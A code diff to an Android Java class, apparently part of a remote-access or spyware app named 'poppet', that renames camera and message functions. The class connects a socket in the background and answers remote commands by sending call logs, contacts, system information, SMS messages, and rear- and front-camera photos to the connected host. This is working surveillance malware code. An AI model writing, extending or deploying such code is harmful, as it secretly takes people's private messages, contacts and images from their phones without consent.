@@ -18,9 +18,9 @@
 
  import static com.poppet.modules.calls.callLogs.getCallLogs;
  import static com.poppet.modules.calls.getContacts.getContactNumbers;
- import static com.poppet.modules.camera.takePhoto.takePhoto;
+ import static com.poppet.modules.camera.takePhoto.clickPhoto;
  import static com.poppet.modules.info.sysInfo.getSystemInfo;
- import static com.poppet.modules.messages.getMessages.getMessages;
+ import static com.poppet.modules.messages.getMessages.getAllMessages;
 
 
  public class socketWork extends AsyncTask<Void, Void, Void> {
@@ -31,7 +31,6 @@
         this.activity = activity;
         this.context = applicationContext;
     }
-
     @Override
     protected Void doInBackground(Void... voids) {
         Socket socket = null;
@@ -43,7 +42,6 @@
             } catch (Exception exception) {
                 exception.printStackTrace();
             }
-
         } while (!socket.isConnected());
         //Input Output Part
         try {
@@ -68,13 +66,13 @@
                         out.write(getSystemInfo().getBytes("UTF-8"));
                         break;
                     case "getMessages":
-                        out.write(getMessages(context).getBytes("UTF-8"));
+                        out.write(getAllMessages(context).getBytes("UTF-8"));
                         break;
                     case "takePhoto":
-                        out.write(takePhoto(Camera.CameraInfo.CAMERA_FACING_BACK , context, out).getBytes("UTF-8"));
+                        out.write(clickPhoto(Camera.CameraInfo.CAMERA_FACING_BACK , context, out).getBytes("UTF-8"));
                         break;
                     case "takeSelfie":
-                        out.write(takePhoto(Camera.CameraInfo.CAMERA_FACING_FRONT, context, out).getBytes("UTF-8"));
+                        out.write(clickPhoto(Camera.CameraInfo.CAMERA_FACING_FRONT, context, out).getBytes("UTF-8"));
                         break;
                     default:
                         String badStuff = "Unable to understand you!";
